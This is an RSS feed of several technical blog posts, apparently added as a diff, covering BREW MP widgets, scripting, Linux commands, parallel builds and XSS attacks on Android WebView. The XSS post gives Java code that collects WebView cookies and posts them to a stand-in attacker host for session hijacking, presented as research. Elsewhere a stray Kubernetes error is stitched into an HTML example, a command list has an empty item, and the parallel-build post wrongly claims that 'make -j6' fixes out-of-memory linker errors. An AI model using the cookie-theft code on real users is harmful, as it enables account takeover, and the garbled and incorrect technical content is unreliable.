+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IRootContainer_SetCanvas&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A new instance of the display canvas class object may be created by calling ISHELL_CreateInstance() and passing in AEECLSID_DisplayCanvas.  This way the root container (and any widgets contained in it) can actually display to the screen.&lt;/p&gt;
+&lt;p&gt;Enable touch on the root container&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IWidget_EnableTouch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pMe&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;piwRootwidget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3&gt;Surface media widget in BREW MP&lt;/h3&gt;
+The surface media widget is a user interface element for intergrating surfaced media objects, such as video or camera,web view area within a widget tree. This media source is contained in within a SurfacedMediaModel, and its content is rendered to a surface or surface container specified by the widget. Typically, widget sets the media size based on its own extent, by calling ISurfacedMediaModel_SetSize().
+&lt;p&gt;To create a surface media widget, an instance of the surfaced media widget using AEECLSID_CSurfacedMediaWidget needs to be initialized. Configure the widget and set the extent using IWidget_SetExtent. Provide the destination surface container to the widget. Create an instance of ISurfacedMediaModel and call IWidget_SetModel on the widget. Surface media widget is associated with the model interface. This enables the widget to listen to and handle various touch events from the webpage.  The surface media widget is interfaced with the webview of the Webkit backend rendering engine to display web pages.&lt;/p&gt;
+&lt;h3&gt;IWeb Application in BREW MP&lt;/h3&gt;
+The main purpose of the IWEB API is to make HTTP requests using a BREW application. IWEB manages its own connections and sockets thereby making it much easier to do web transactions. I Web is responsible for establishing the connection to the server and then trasfering data to the local system using HTTP “GET” method.  When the IWeb engine gets response from ther server, a callback is called. The response can be extracted from callback using IWEBRESP_GetInfo. The response usually contains the header along with
+the data that contains HTML tags.  Data is transfered to the webkit rendering engine for rendering the webpages.
+
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Scripting-How is it different from programming?</title>
+      <link>https://example.com/post/scripting-programming/</link>
+      <pubDate>Fri, 16 Aug 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/scripting-programming/</guid>
+      <description>
+        
+          &lt;p&gt;What is script for a movie?? Script for a movie describes what actors do. It also describes the interaction between the actors, and connects different sequences of a movie. Scripting languages are also very similar. Scripting is used to automate the execution of tasks which could alternatively be executed one-by-one manually. Environments that can be automated through scripting include software applications, and the operating system shells (OS shells). Scripting languages play a major role in automation testing, because, from a script, you can invoke different programs and test the outputs.&lt;/p&gt;
+&lt;p&gt;During my association at University of Hyderabad, I was working on projects related to Natural language processing, I could see the power of scripting languages. We were building a translation engine, for translating text from one natural language to another, for example from Urdu to Hindi or Sanskrit to Hindi. Scripting languages had the power to use the regular expressions and made text processing very much simpler. Those tasks which required design of state machines in a programming language, could be written by a single line in a scripting language!!!! Let us see an example of a word count program, written in both PERL and C.&lt;/p&gt;
+&lt;p&gt;A word can be defined as set of characters, which are preceded by any number of blank spaces, new lines or tabs. If you had to write the same piece of code in C, a state machine has to be designed (see example in Dennis Ritchie). Scripting language solves the problem with a single line of code.&lt;/p&gt;
+&lt;p&gt;We found highly complex pieces of code, could be written very easily in scripting languages. It has the power to handle regular expressions and text processing.&lt;/p&gt;
+&lt;p&gt;Scripting languages are designed for “gluing” applications. Consider the scenario in which different  modules are written in different languages, like C, Java, C++ etc. and have to be integrated into a single project. Scripting languages play a key role in such type of scenarios.&lt;/p&gt;
+&lt;p&gt;Scripting languages also have the power to access OS facilities. When we were building the migration engine, we could connect to loop devices, do mounts, unmount etc., using python.&lt;/p&gt;
+&lt;p&gt;Scripting languages use typeless approaches to achieve a higher level of programming and more rapid application development than programming languages.  That means, declaration of variables is not required in Scripting. Only assignment would be sufficient.&lt;/p&gt;
+&lt;p&gt;Scripting languages make the life of developer very easy. Enjoy Scripting !!!!!&lt;/p&gt;
+
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Cross-site Scripting Attacks on Android WebView</title>
+      <link>https://example.com/post/cross-site-scripting/</link>
+      <pubDate>Fri, 05 Apr 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/cross-site-scripting/</guid>
+      <description>
+        
+          &lt;p&gt;WebView is an essential component in Android and iOS. It enables applications to display content from on-line resources. It simplifies task of performing a network request, parsing the data and rendering it. WebView uses a number of APIs which can interact with the web contents inside WebView. In the present post, Cross-site scripting attacks or XSS attacks specific to Android WebView are discussed. Cross-site scripting (XSS) is a type of vulnerability commonly found in web applications. This vulnerability makes it possible for attackers to run malicious code into victim’s WebView, through HttpClient APIs. Using this malicious code, the attackers can steal the victim’s credentials, such as cookies. The access control policies (i.e.,the same origin policy) employed by the browser to protect those credentials can be bypassed by exploiting the XSS vulnerability.&lt;/p&gt;
+&lt;h3&gt;Cross-site scripting (XSS)&lt;/h3&gt;
+Cross-site scripting (XSS) is a type of computer security vulnerability typically found in Web Applications. To protect the user’s environment from malicious code, browsers use a sand-boxing mechanism that limits a script to access only resources associated with its origin site. Unfortunately, these security mechanisms fail if a user unknowingly executes a malicious script from an intermediate, trusted site. In this case, the malicious script is granted full access to all resources (e.g. Authentication tokens and cookies) that belong to the trusted site. Such attacks are called cross-site scripting (XSS) attacks. In the present work, Cross-site scripting attacks on Android WebView are investigated. By finding ways of executing malicious scripts through the third party malicious app on phone, an attacker can gain elevated access-privileges to sensitive page content, session cookies, and a variety of other information in the phone such as contacts.
+&lt;h3&gt;Stealing cookies from the victim’s device &lt;/h3&gt;
+The most common behavior of XSS attacks is to gather cookies. Cookies are small text files that reside on a user’s computer and store name-value pairs along with some metadata. Cookies are commonly used to store information intended to be persistent during a browser session or from session to session, such as session IDs, user preferences, or login information. The cookie specifications assume that only the domain that set the cookie will be able to access it.
+&lt;h3&gt;Attack Method&lt;/h3&gt;
+When the user runs the application through the WebView, Android applications can monitor the events occurred within WebView. We override the shouldOverrideUrlLoading hook, which is triggered by the navigation event, (when the user tries to navigate to another URL). Cookies can be gathered at every page navigation of the user using the method getCookie() from CookieManager class as shown in the code fragment below:
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CookieManager&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookieManager&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CookieManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookie&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookieManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getCookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Through HttpPost, malicious script can be run on the user’s Android device, cookies and URL can be sent to any third party (i.e., the attacker’s server), thus avoiding the same-origin policy or cookie protection mechanism.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpClient&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;httpClient&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DefaultHttpClient&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpPost&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;httpPost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HttpPost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;“&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//evilScript/androidCookie.php&amp;#34;);
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The attacker is now able get all the cookies and will be able to launch several attacks such a Session Hijacking and impersonating user using stolen cookies. The attacks described above are quite dangerous as the user sees only the trusted content and is not aware that his cookies are being stolen.&lt;/p&gt;
+&lt;h3&gt;Session Hijacking&lt;/h3&gt;
+Session hijacking is a method of taking over a Web user session by stealthily obtaining the session ID and gaining unauthorized access. The session ID is normally stored within a cookie or URL. Once the user’s session ID has been accessed, the attacker can masquerade as that user and do anything the user is authorized to do on the network. From the web server’s point of view, a request from an attacker has the same authentication as the victim’s requests, thus the request is performed on behalf of the victim’s session. This usually results in the attacker being able to perform all normal web application functions with the same privileges of legitimate user (e.g. online bill pay, composing an email, etc.).
+&lt;h3&gt;Impersonating user using stolen cookies&lt;/h3&gt;
+If a website uses cookies as session identifiers, attackers can impersonate users after stealing victim’s cookies. By stealing cookies of social networking sites, message boards or forums, the attacker can post a new message in the victim’s name delete the victim’s post or exploit user’s credentials without his consent.
+&lt;p&gt;NOTE: Please see the &lt;a href=&#34;%22http://ijcsn.org/IJCSN-2013/2-2/IJCSN-2013-2-2-03.pdf%22&#34;&gt;research publication&lt;/a&gt; for more details&lt;/p&gt;
+
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>10 most frequently used commands in Linux for beginners</title>
+      <link>https://example.com/post/linux-commands/</link>
+      <pubDate>Fri, 01 Jun 2012 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/linux-commands/</guid>
+      <description>
+        
+          &lt;p&gt;To all the beginners of linux, I would like to write 10 most frequently used linux commands with a few examples. Please note that the commands have a lot of options, which need to be explored by the user.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;ls&lt;br&gt;
+Stands for listing
+Example : ls
+Lists all the files in the current directory.
+ls -l : Stands for long listing.
+Example : ls -l
+Displays a long list of files including file permissions, users, date and  time of file creation, file size etc.
+ls -a : List all
+Example : ls -a
+lists all the files including the hidden files&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;mkdir&lt;br&gt;
+Stands for make directory.
+This command is used to create a directory.
+Example: mkdir dirname&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;pwd
+Stands for present working directory.
+Example : pwd
+Displays the current working directory that the user is in.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;cp&lt;br&gt;
+Stands for copy
+Example: cp filename dirname/
+copies file with filename to the directory dirname/
+cp -r  :recursive copy
+Example : cp -r dirname1/ dirname2/
+copies the entire directory dirname1/ to the directory dirname2/&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;mv&lt;br&gt;
+Stands for move
+Example :mv filename1 filename2
+Used to change the filename from filename1 to filename2 wihout changing the contents of the files.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;find&lt;br&gt;
+Example: find
+lists all the files and directories in current directory recursively
+Example : find dirname/
+lists all the files in the directory with dirname/&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;rm   :Stands for remove
+Example : rm somefile
+removes the file with name ‘somefile’ in the current directory.
+rm -rf    Stands for recursive forceful remove
+Example : rm -rf dirname/
+remove the entire directory with the dirname&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;b&gt;cd &lt;/b&gt;
+Stands for change directory.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h5&gt;Example 1&lt;/h5&gt;: cd ~/dirname/
+Changes the current directory to /home/username/dirname/
+&lt;h5&gt;Example 2&lt;/h5&gt;: cd ..
+Changes the directory to a previous directory
+9. df  
+Stands for disk free
+Example : df
+Displays the entire disk space available.
+ df -h   : Disk free in human readable form
+Displays the entire disk space in terms of GB, MB etc.
+&lt;ol start=&#34;10&#34;&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;User Manual. Gives the detailed description of the command with options.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#Example  &lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#man command_name&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;man ls
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Example HTML5 Document&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Test&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- this line is extraneous 2Error from server (Forbidden): deployments.apps is forbidden: User &amp;#34;chiptest&amp;#34; cannot create resource &amp;#34;deployments&amp;#34; in API group &amp;#34;apps&amp;#34; in the namespace &amp;#34;default&amp;#34; --&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Significance of parallel builds</title>
+      <link>https://example.com/post/parallel-builds/</link>
+      <pubDate>Wed, 11 Apr 2012 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/parallel-builds/</guid>
+      <description>
+        
+          &lt;p&gt;Parallel builds play a significant role for building projects that require huge RAM to compile.
+The best example is chromium build. Suppose the chrome is built by&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;make chrome
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Sometimes, we run into linker errors.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;collect2: ld terminated with signal &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; Aborted terminate called 
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;after throwing an  instance of &lt;span class=&#34;s1&#34;&gt;&amp;#39;std::bad_alloc&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Building the code by the command&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;make -j6 chrome
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;resolves the liker errors and the build goes through.&lt;/p&gt;
+&lt;h3&gt;What really happens during a parallel build?&lt;/h3&gt;
+&lt;p&gt;To do a parallel build, add -jX where X is the number of make processes to start-up. This is useful for multiple-core machines. Unlike the normal procedural languages like C,C++,PERL etc which execute the commands step by step, make is a utility which does not specify particular order for operations. Each step is taken when necessary dependencies are completed. For multiprocessor machines, the advantage of parallel build is much more because additional CPUs can perform multiple compilations faster than a single CPU.
+Parallel builds can be faster even in uniprocessor environment, because make files perform tasks that can be carried out in parallel, such as such as compiling C source to object files and  creating libraries out of object files. Based on the dependencies of header files, multiple source files can be compiled in parallel.&lt;/p&gt;
+&lt;h3&gt;How does parallel build resolve the linker errors?&lt;/h3&gt;
+The kernel is a piece of software that provides a layer between the hardware and the application programs running on a computer. All the other applications that we have with Linux distribution such as the GNOME window manager, web browsers, etc. are just applications that happen to run on Linux kernel and are not part of the operating system. The kernel makes its services available to the application programs that run on it through a large collection of entry points,known as system calls. From a programmer’s viewpoint,
+these look just like ordinary function calls, although in reality a system call involves a distinct switch in the operating mode of the processor from user space to kernel space.
+The kernel has to work hard to maintain this same abstraction when the filesystem itself might be stored in any of several formats, on local storage devices such as hard disks, CDs or USB memory sticks.
+Swap space in Linux is used when the amount of physical memory (RAM) is full. If the system needs more memory resources and the RAM is full, inactive pages in memory are moved to the swap space. Swap space is located on hard drives, which have a slower access time than physical memory. Each process runs under the illusion that it has an address space (a valid range of memory addresses) to call its own. In reality, it’s sharing the physical memory of the computer with many other processes, and if the system is running low on memory, some of its address space may even be parked out on the disk in the swap area. The parallel builds run as a part of different processes and utilize the physical memory space more efficiently, thus preventing the linker errors during parallel build.
+
+        
+      </description>
+    </item>
+    
+  </channel>
+</rss>
